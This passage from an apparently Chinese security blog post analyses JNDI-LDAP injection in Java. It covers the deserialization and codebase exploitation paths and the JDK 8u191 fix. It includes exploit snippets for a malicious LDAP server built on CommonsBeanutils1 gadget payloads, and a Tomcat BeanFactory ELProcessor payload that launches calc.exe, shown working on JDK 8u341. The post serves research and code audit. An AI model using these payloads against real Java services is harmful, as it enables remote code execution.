src="/img/jndi-injection-history/16.png"></p><p>当存在javaClassName属性时，最终返回对象<code>Reference(javaClassName, javaFactory, javacodebase[0])</code>。如果存在javaReferenceAddress值，进入组装RefAddr对象的流程，可以看到如果构造的数据满足条件，与javaSerializedData属性的解析过程一样，进入deserializeObject反序列化流程，这是JNDI-LDAP的第二个利用点</p><p><img src="/img/jndi-injection-history/17.png"></p><h3 id="3-3、Ldap-Reference-codebase的远程利用"><a href="#3-3、Ldap-Reference-codebase的远程利用" class="headerlink" title="3.3、Ldap Reference#codebase的远程利用"></a>3.3、Ldap Reference#codebase的远程利用</h3><p>拿到了Reference对象，接着回到com.sun.jndi.ldap.LdapCtx#c_lookup的解析流程，执行第4步的getObjectInstance方法，该方法与JNDI_RMI解析过程的javax.naming.spi.NamingManager#getObjectInstance一致，都是获取codebase加载远程factory类并实例化。这是JNDI-LDAP的第三个利用点</p><p><img src="/img/jndi-injection-history/18.png"></p><p>修复：com.sun.naming.internal.VersionHelper12#loadClass(java.lang.String, java.lang.String)加载外部factory时，在JDK 8u191时增加了com.sun.jndi.ldap.object.trustURLCodebase&#x3D;false的配置，造成loadClass()直接返回null，无法通过codebase去加载构造的外部恶意类。但是上面提到的第一种javaSerializedData、第二种RefAddr方式仍然可以使用</p><p><img src="/img/jndi-injection-history/19.png"></p><p><img src="/img/jndi-injection-history/20.png"></p><p>基本的解析流程都分析完了，本地测试时可以起个ldap服务构造EXP，搭建ldap服务可使用ldapsdk包。可以maven加载也可以单独引入：<a href="https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1">https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">//pom.xml<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ldap服务代码可参考<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java</a></p><h2 id="4、版本相关问题"><a href="#4、版本相关问题" class="headerlink" title="4、版本相关问题"></a>4、版本相关问题</h2><p>JDK8系列最新版本(8u341)测试，未对JNDI_LDAP的第一种javaSerializedData、第二种javaReferenceAddress、Tomcat BeanFactory#getObjectInstance的利用方式进行限制。如果目标ClassPath存在Gadget，还是可以继续利用的。我们分别来看下：</p><p>1、JNDI_LDAP的第一种javaSerializedData利用方式，只需要把恶意类设置为javaSerializedData的属性值即可</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//恶意服务端设置两个属性javaClassName、javaSerializedData</span><br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Serializer.<span class="hljs-params">serialize</span>(<span class="hljs-params">new</span> CommonsBeanutils1()</span>.get<span class="hljs-constructor">Object(<span class="hljs-string">&quot;mspaint&quot;</span>)</span>));<br></code></pre></td></tr></table></figure><p><img src="/img/jndi-injection-history/21.png"></p><p>2、JNDI_LDAP的第二种javaReferenceAddress利用方式，对于RefAddr对象的数据构造可参考com.sun.jndi.ldap.Obj#decodeReference</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-number">1</span>、将javaReferenceAddress属性值的首字符做为分割符，我这里使用!符号<br><span class="hljs-number">2</span>、第一跟第二个分隔符中为RefAddr position，<span class="hljs-type">int</span>类型数据，使用<span class="hljs-number">1</span><br><span class="hljs-number">3</span>、第二跟第三个分隔符中为RefAddr type，<span class="hljs-type">String</span>类型数据，使用a<br><span class="hljs-number">4</span>、第三个与第四个分隔符在一起，后面是经过base64编码的序列化数据，使用cb链演示<br></code></pre></td></tr></table></figure><p><img src="/img/jndi-injection-history/22.png"></p><p>恶意服务端设置三个属性objectClass、javaClassName、javaReferenceAddress</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaReferenceAddress&quot;</span>,<span class="hljs-string">&quot;!1!a!!&quot;</span>+<span class="hljs-params">new</span> BASE64Encoder()</span>.encode(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Serializer</span>.</span></span>serialize(<span class="hljs-keyword">new</span> <span class="hljs-constructor">CommonsBeanutils1()</span>.get<span class="hljs-constructor">Object(<span class="hljs-string">&quot;mspaint&quot;</span>)</span>)));<br></code></pre></td></tr></table></figure><p><img src="/img/jndi-injection-history/23.png"></p><p>成功在JDK8系列最新版本完成利用</p><p>3、Tomcat BeanFactory#getObjectInstance的本地利用方式，可以看到在JDK8系列的最新版本8u341利用成功</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ResourceRef resourceRef = <span class="hljs-built_in">new</span> ResourceRef(&quot;javax.el.ELProcessor&quot;,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">false</span>,&quot;org.apache.naming.factory.BeanFactory&quot;,<span class="hljs-keyword">null</span>);<br>resourceRef.<span class="hljs-keyword">add</span>(<span class="hljs-built_in">new</span> StringRefAddr(&quot;forceString&quot;,&quot;x=eval&quot;));<br>resourceRef.<span class="hljs-keyword">add</span>(<span class="hljs-built_in">new</span> StringRefAddr(&quot;x&quot;,&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;<span class="hljs-built_in">new</span> java.lang.ProcessBuilder[<span class="hljs-string">&#x27;(java.lang.String[])&#x27;</span>]([<span class="hljs-string">&#x27;calc.exe&#x27;</span>]).<span class="hljs-keyword">start</span>()\&quot;)&quot;));<br></code></pre></td></tr></table></figure><p><img src="/img/jndi-injection-history/24.png"></p><h2 id="5、参考"><a href="#5、参考" class="headerlink" title="5、参考"></a>5、参考</h2><p><a href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA">https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA</a></p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></p><p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p><p><a href="https://evilpan.com/2021/12/13/jndi-injection/">https://evilpan.com/2021/12/13/jndi-injection/</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSec</tag>
      
      <tag>JNDI</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
